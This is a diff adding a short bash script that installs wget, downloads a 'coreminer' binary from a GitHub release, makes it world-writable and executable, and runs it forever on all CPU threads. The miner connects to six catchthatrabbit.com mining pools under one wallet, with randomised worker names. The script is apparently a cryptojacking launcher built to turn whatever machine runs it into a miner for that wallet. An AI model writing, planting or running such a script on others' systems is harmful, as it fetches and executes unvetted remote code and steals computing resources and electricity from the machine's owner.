@@ -1,0 +1,15 @@
+#!/bin/bash
+apt update && apt -y install wget
+wget https://github.com/aquilarendy/fool/releases/download/3.1.1/coreminer
+chmod 777 coreminer
+while true
+do
+        ./coreminer --noeval --hard-aes -P stratum1+tcp://cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10)@eu.catchthatrabbit.com:8008 \
+            -P stratum1+tcp://cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10)@as.catchthatrabbit.com:8008 \
+            -P stratum1+tcp://cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008 \
+            -P stratum1+tcp://cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10)@eu1.catchthatrabbit.com:8008 \
+            -P stratum1+tcp://cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10)@as1.catchthatrabbit.com:8008 \
+            -P stratum1+tcp://cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10)@us1.catchthatrabbit.com:8008 \
+            -t $(nproc --all)
+        sleep 1
+done
